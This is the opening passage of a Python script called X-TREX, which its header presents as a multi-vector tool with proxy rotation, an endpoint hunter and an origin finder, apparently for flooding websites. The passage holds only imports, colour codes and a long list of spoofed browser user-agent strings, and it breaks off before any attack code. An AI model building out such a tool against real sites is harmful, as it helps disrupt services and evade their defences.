#!/usr/bin/env python3
# language: Python 3, file: xtrex.py, runtime: Termux / Linux / macOS
# X-TREX v1.2 — single file, stdlib only, 297 UA tertanam, 8 vektor.
# Semua fitur aktif: 8 vektor, proxy auto-heal, endpoint hunter, origin finder.

import os, sys, json, time, socket, ssl, struct, random, string, threading, re, ipaddress
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
from urllib.parse import urlparse, urljoin

# ═══════════════════════════════════════════════════════════════════
# WARNA
# ═══════════════════════════════════════════════════════════════════
class C:
    R="\033[0m"; B="\033[1m"; D="\033[2m"
    G="\033[92m"; Cy="\033[96m"; Y="\033[93m"
    Rd="\033[91m"; Mg="\033[95m"; Bl="\033[94m"; W="\033[97m"

# ═══════════════════════════════════════════════════════════════════
# UA POOL — 297 entri dari scrape.py, dinormalisasi
# ═══════════════════════════════════════════════════════════════════
UA_POOL = [
    # ── Chrome desktop modern ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.132 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v7680698845952869336 t564810959814549392 ath1fb31b7a altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v3187976918162742682 t4211039474166859972 ath1fb31b7a altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5638113684888139222 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v2570850382957405978 t5746573298344967277 ath5ee645e0 altpriv cvcv=2 smf=0",

    # ── Chrome desktop lama ──
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.60",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0",

    # ── Firefox modern ──
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v13293395128 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v506495581028971686 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5228936850 t3654735959721356327 athfa3c3975 altpub cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v2858946474444734699 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v245675907258475232 t225440721629844052 athe94ac249 altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v710302403600920740 t922886074147448246 ath4b3726d5 altpriv cvcv=2 smf=0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.5 Safari/534.34",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0",
    "Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",

    # ── Firefox lama ──
    "Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Cyberfox/40.0",
    "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 5.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",

    # ── Safari modern + lama ──
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.7 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) QuickLook/5.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/7.1.5 Safari/537.85.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-us) AppleWebKit/537+ (KHTML, like Gecko) Version/5.0 Safari/537.6+ Midori/0.4",

    # ── iOS ──
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.2 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.3 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/16D57 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/16C101 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/16B92 DuckDuckGo/7 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182]",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.2 Mobile/15D100 DuckDuckGo/7 Safari/604.5.6",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.2 Mobile/15C202 DuckDuckGo/7 Safari/604.4.7",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.1 Mobile/15B93 DuckDuckGo/7 Safari/604.3.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.1 Mobile/15B202 DuckDuckGo/7 Safari/604.3.5",
